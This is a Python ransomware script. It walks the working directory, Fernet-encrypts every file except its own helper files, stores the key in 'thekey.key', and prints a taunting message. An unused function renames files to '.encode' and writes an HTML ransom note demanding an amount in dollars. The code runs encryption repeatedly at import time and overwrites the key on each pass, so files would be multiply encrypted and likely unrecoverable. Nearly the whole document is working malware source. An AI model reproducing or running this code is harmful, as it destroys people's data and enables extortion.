#!/usr/bin/python3
import os, platform, requests, time
from cryptography.fernet import Fernet
import cryptography
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

import secrets
import base64
import getpass



def encrypt():
    # # Encryption Start  ===============================
    files = []

    for file in os.listdir():
        if file == "encrypt.py" or file == "decrypt.py" or file == "creatList.py" or file == "index.html" or file == "find.py" or file == "thekey.key" or file == "opratingSys.txt":
            continue
        if os.path.isfile(file):
            files.append(file)
        
    print(files)
    key = Fernet.generate_key()
    # print(key)

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)


    
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print("Ok tata byby byby khatam !!!\n Your all files are encrypted. ")
    # # Encryption End ===========================================


mypath = os.walk(os.getcwd())
for root_path, folder_names, file_names in mypath:  
    for file in file_names:
        filePath = root_path + "//" + file
        encrypt()
    
    for dirctorys in folder_names:
        dirctoryPath = root_path + "//" + dirctorys
        encrypt()



def encryptFileExtion():
    path = os.walk(os.getcwd())
    for root, dirc, files in path:
        for file in files:
            sourspath = root + "//" + file
            destinationpath = root + "//" + file + ".encode"
            os.rename(sourspath, destinationpath)

        for dirctory in dirc:
            filename = root + "//" + file
            filehendler = open(filename, "w")
            filehendler.write("""

            	<!DOCTYPE html>
		<html lang="en">
		<head>
		    <meta charset="UTF-8">
		    <meta http-equiv="X-UA-Compatible" content="IE=edge">
		    <meta name="viewport" content="width=device-width, initial-scale=1.0">
		    <title>Document</title>
		    <style>
			body{min-height: 100vh;}
			main{padding: 5px;}
			#redt{color: red;}
		    </style>
		</head>
		<body>
		    <main>
			<h3>Your system is hacked</h3>
			<h4>Don't try any think!</h4>
			<h5>Else your system was cresed</h5>
			<h6 id="errorMsg"></h6>
			<input type="text" name="username" id="username" value="" placeholder="Enter your name"/>
			<input type="email" name="email" id="email" value="" placeholder="Enter your email id"/>
			<input name="amount" id="amount" value="" placeholder="Enter amount in $"/>
			<button type="submit">Submit</button>
		    </main>
		    <footer>
			<samp id="redt">*</samp>If you enter ronge email id thetes your foltes.
		    </footer>
		    <script charset="utf-8">
			amun = document.getElementById("amount")
			if (amun <= 100){

			}else{
				document.getElementById("errorMsg").html = "Envalid amounts";
			}
			
		    </script>
		</body>
		</html>            
            """)
            filehendler.close()
#encryptFileExtion()



